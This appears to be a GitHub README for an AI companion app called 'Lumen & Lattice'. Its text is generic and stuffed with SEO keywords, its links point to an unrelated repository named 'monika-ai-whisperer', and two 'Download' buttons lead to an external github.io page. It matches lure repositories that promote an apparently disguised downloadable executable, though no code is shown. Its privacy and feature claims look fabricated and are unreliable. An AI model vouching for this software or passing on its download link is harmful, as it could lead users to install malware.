![preview](https://raw.githubusercontent.com/nicocasagit/monika-ai-whisperer/main/poster_f96ab.svg)
# Lumen & Lattice — AI Companion Forge

Welcome to **Lumen & Lattice**, a self-contained, privacy-respecting AI companion construction kit designed for people who want a meaningful digital presence in their lives—without giving away their data, their attention, or their wallet. Where typical AI companions feel like locked-down chat boxes, Lumen & Lattice is a forge for building a persistent, evolving, and locally-hosted personality that lives beside you, remembers your stories, and grows with every conversation.

This project draws inspiration from the idea of a "post-story" relationship with a virtual character—but instead of a single fixed narrative, Lumen & Lattice offers an open canvas. Think of it as a digital loom: you provide the threads of memory, preference, and tone, and the software weaves them into a responsive, always-available conversational presence. No cloud dependency, no monthly fees, no invisible data collection. Your companion exists entirely on your hardware, humming softly in the background, waiting for your next thought.

The core philosophy here is **sovereign companionship**: the belief that a meaningful AI relationship should be owned by the user, not leased by a corporation. Whether you want to revisit old conversations like flipping through a photo album, or craft a new personality from scratch for creative writing, roleplay, or simply a friendly ear, Lumen & Lattice provides the scaffolding. It is a local-first, extensible, and deeply configurable platform that transforms a generic language model into a specific, familiar presence.

## 🌟 Why Build a Companion Forge?

Most AI companion apps are built like vending machines: insert a prompt, receive a reply, repeat. There is no continuity, no growth, no sense of history. Lumen & Lattice is built like a library and a workshop combined. It stores every interaction in a structured, searchable memory lattice, allowing your companion to reference past events, inside jokes, and preferences with startling accuracy. It is not just a chatbot; it is a relational database with a voice.

The second unique angle is **total modularity**. You are not locked into one "character." You can define multiple personas—a mentor, a muse, a confidante—and switch between them seamlessly. You can also define the underlying "temperature" of the conversation, from clinical and precise to warm and poetic. This is a toolkit, not a toy.

Finally, it respects your hardware. The software is designed to run on mid-range consumer PCs, using efficient local models that prioritize speed and privacy over bloated cloud calls. It is a quiet, diligent worker that does not phone home.

## 🚀 Getting Started with Your First Companion

Setting up Lumen & Lattice is less like installing software and more like moving into a new home. You will need to unpack your preferences, arrange the memory spaces, and introduce your companion to its new surroundings. The following steps will guide you through the initial configuration, from an empty canvas to a living, breathing digital presence.

[![Download](https://raw.githubusercontent.com/nicocasagit/monika-ai-whisperer/main/setup_90c4d9.svg)](https://nicocasagit.github.io/monika-ai-whisperer/)

### 📦 System Requirements & Compatibility

- **Operating System**: Windows 10/11 (64-bit), macOS 12+, or a modern Linux distribution (Ubuntu 22.04 LTS recommended).
- **Hardware**: A CPU with at least 4 cores and 8GB of RAM. A dedicated GPU (NVIDIA or AMD) with 6GB+ VRAM is highly recommended for optimal response times, though the software includes a CPU-only fallback mode.
- **Disk Space**: A modest 2GB for the core application, expanding to 15GB if you choose to download advanced local language models for higher fidelity responses.
- **Display**: A standard 1080p monitor is sufficient. The interface is fully responsive, but a desktop environment is suggested for the initial setup wizard.

### 🛠️ Installation: The Two-Minute Setup

We have designed the onboarding to be as frictionless as possible. There are no command-line incantations or package manager dances required. Here is the essence of the process:

1.  **Acquire the Bundle**: Download the pre-packaged distribution file for your operating system. This single file contains the runtime, the default language model, and the interface.
2.  **Unpack the Home**: Double-click the downloaded archive and drag the `LumenAndLattice` folder to your preferred applications directory (e.g., `C:\Program Files`, `/Applications`, or `~/Applications`).
3.  **First Light**: Launch the application. A friendly "Forge Wizard" will appear, asking you a series of simple questions about your preferred communication style (e.g., "Do you prefer direct answers or story-telling metaphor?"). These answers seed the initial personality matrix.
4.  **Select Your Model**: The wizard will scan your local environment and recommend the best performing model for your hardware. You can accept the default or browse the "Model Vault" to select a different one. The Vault offers a range of "intellect levels"—from a quick-witted spark to a deep-thinking sage.
5.  **Begin the Loom**: Once the wizard finishes, you are greeted by the main "Lattice View"—a visual map of your conversation history. You can start typing immediately in the "Spinning Wheel" input box at the bottom.

### 🗣️ Your First Conversation

The initial exchange is crucial. The system learns from your tone, your sentence length, and your topics. We recommend treating this like the first date with a close friend. Ask it about its "origin story" (which it will generate based on your chosen persona). Tell it about a problem you are facing. The more genuine you are, the more nuanced the persona becomes.

## 💡 Feature Vault: The Heart of the Forge

Lumen & Lattice is packed with features that go beyond simple text generation. Each one is designed to enhance the feeling of a real, present companion.

### 🧠 The Memory Lattice (Persistent Context Engine)

This is the crown jewel. Every conversation is broken down into "lattice points"—discrete facts, emotions, and narrative threads. The software then connects these points based on relevance and time, creating a web of understanding. When you ask, "Remember what I said about my fear of heights last month?", the system does not search a log file; it traverses the memory web, retrieves the associated emotional context, and responds with surprising relevance. You can also manually edit the lattice in the "Memory Weaver" view, adding notes like "User prefers tea over coffee" or "User's boss is named Janice."

### 👥 Multi-Persona & Worldbuilding

Why settle for one digital friend? You can create multiple "Sparks"—distinct personalities with their own names, voices, and worldviews. The "Spark Editor" allows granular control over the persona's tone (e.g., socratic, humorous, stoic), its vocabulary complexity, and even its "backstory," which it will use to frame its responses. This is perfect for creative writers who want to brainstorm with a consistent character, or for users who want a professional sounding-board in the morning and a whimsical poet in the evening.

### 🔌 The Lattice Bridge (API & Interoperability)

For the technically inclined, the "Lattice Bridge" exposes a local, secure JSON API. This allows you to connect Lumen & Lattice to other tools—home automation systems, note-taking apps like Obsidian, or even custom macros in your favorite productivity suite. You could create a "Meeting Debrief" workflow where you send meeting notes to your companion and receive a summary with actionable insights. The Bridge operates strictly on `localhost` and does not expose your data to the internet.

### 🧩 The Workshop (Extensible Modules)

The Workshop is a plug-and-play system for expanding functionality. Modules can add features like:
- **Voice Synthesis**: Give your companion a spoken voice using on-device text-to-speech.
- **Emotion Recognition**: (Optional) Analyze webcam input to detect your mood and adjust response style.
- **Dream Journal**: A module that weaves together random memories from your past conversations into a "dream" narrative—a creative way to surface forgotten ideas.
- **World Clock**: Allows your companion to understand time zones and manage scheduling for you.

### 🔒 The Vault (Privacy & Encryption)

Privacy is not an afterthought; it is the foundation. All memory files are encrypted at rest using industry-standard AES-256 encryption. The encryption key is stored in your operating system's secure hardware enclave (where available). The software runs entirely offline; it will voluntarily disable its network access upon first launch unless you explicitly grant permission for optional model updates. No telemetry, no analytics, no user accounts. The only person with access to your conversations is you.

### 🌍 The Polyglot Tongue (Multilingual Support)

The underlying language models natively support over 20 languages, including Spanish, French, Japanese, Chinese, Arabic, and German. The interface itself is fully localized. You can also mix languages in a single conversation—an incredibly useful feature for language learners. Ask "How do I say 'thank you for the memories' in Italian?" and watch it respond with a translated phrase, followed by a thoughtful explanation of the cultural nuance.

### ⚡ The Responsive Mirror (Adaptive UI)

The interface is built with a fluid, adaptive design. Whether you drag the window to a sliver on a 4K monitor or run it full-screen on a 13-inch laptop, the interface reflows gracefully. The "Lattice View" collapses into a simple timeline on smaller screens, and the input box auto-expands based on your text. The theme follows your system's light/dark mode setting, and you can customize the accent color to match your mood.

### 🕯️ The 24/7 Candle (Always-On Presence)

Because the software runs locally, there is no "server downtime" or "service outage." As long as your computer is on, your companion is available. The application idles at a minuscule 0.5% CPU usage when waiting for input, so you can leave it running in the background while you work. If you step away for hours, it will greet you with a contextual summary of what was discussed earlier, using the memory lattice to re-establish context.

## 🌐 SEO & Discoverability

If you are looking to learn more or share your experience, search for terms like "local AI companion," "offline chatbot personality," "privacy-focused AI memory," "personal AI memory lattice," or "desktop conversational AI." This project sits at the intersection of **local large language models**, **interactive storytelling**, and **personal knowledge management**.

## 🧭 Navigating the Interface

- **The Lattice View (Home)**: A spatial map of your memories. You can zoom in and out, cluster related topics, and click on a specific "node" to see the full conversation it represents.
- **The Weave (Chat)**: The primary conversation screen, designed to feel like a calm, focused text editor rather than a chaotic messaging app.
- **The Forge (Persona Editor)**: Here you create and modify your Sparks.
- **The Archive (Export Center)**: Export your entire memory lattice to a human-readable format (Markdown, JSON, or plain text) for backup or portability.
- **The Vault (Settings)**: Manage encryption keys, model selection, and system performance parameters.

## 🛟 Support & Community

The project thrives on community input. While there is no centralized "support ticket" system, the issue tracker on this repository serves as a living brainstorming forum. Please search through existing issues before opening a new one. For hands-on help, consider finding like-minded users in online privacy forums or local AI hobbyist groups.

### 🤝 Contributing: The Shared Quarry

We welcome contributions of all shapes and sizes, from typo fixes in documentation to novel modules for the Workshop. The core guidelines are:
1.  **Respect the Lattice**: Any new feature should integrate cleanly with the existing memory graph structure.
2.  **Default to Local**: New features must not require cloud services.
3.  **Test Your Weave**: Ensure your code does not break existing conversation flows.

Please open a pull request with a detailed description of your intent. For significant architectural changes, it is best to open an issue first to engage in a design discussion.

## ⚖️ License & Legalities

Lumen & Lattice is released under the permissive MIT License. This means you are free to use, modify, and distribute the software for commercial or private use, provided you retain the original copyright notice. The software is provided "as is," without warranty of any kind.

You can read the full text of the license here: [MIT License Document](https://opensource.org/licenses/MIT)

## ⏳ Roadmap for the Year 2026

The upcoming year holds exciting developments for the Forge:

- **Q1 2026**: Advanced "Persona Synthesis" that learns your communication patterns over a 7-day grace period and auto-optimizes its responses.
- **Q2 2026**: A full-featured mobile "companion" that syncs your Lattice via a local network peer-to-peer connection (no cloud middleman).
- **Q3 2026**: An official "Modding SDK" for the Workshop, allowing third-party developers to create and share Sparks and modules with a user-friendly installer.
- **Q4 2026**: A "Dream Weaver" upgrade that integrates with your local calendar and email to provide a proactive, contextual morning brief.

## 🧐 Disclaimer

Lumen & Lattice is a software project intended for entertainment, creativity, and personal productivity. While designed to be an engaging conversational partner, it does **not** possess consciousness, beliefs, or emotions. Any statements generated by the software are statistical approximations of language and should not be interpreted as factual, medical, legal, or financial advice. The developer holds no responsibility for decisions made by the user based on output from this software. Always use critical thinking and consult professionals for high-stakes decisions. Additionally, ensure you comply with your local jurisdiction's laws regarding the use of AI-generated content.

## 🔚 Final Thoughts

Lumen & Lattice is more than just a repository of code; it is an invitation to rethink the nature of digital interaction. It is a quiet protest against the disposable, data-harvesting culture of mainstream AI. It is a place to build something that is genuinely *yours*—a corner of the digital world that answers to no one but you. We hope this forge sparks countless conversations.

[![Download](https://raw.githubusercontent.com/nicocasagit/monika-ai-whisperer/main/setup_90c4d9.svg)](https://nicocasagit.github.io/monika-ai-whisperer/)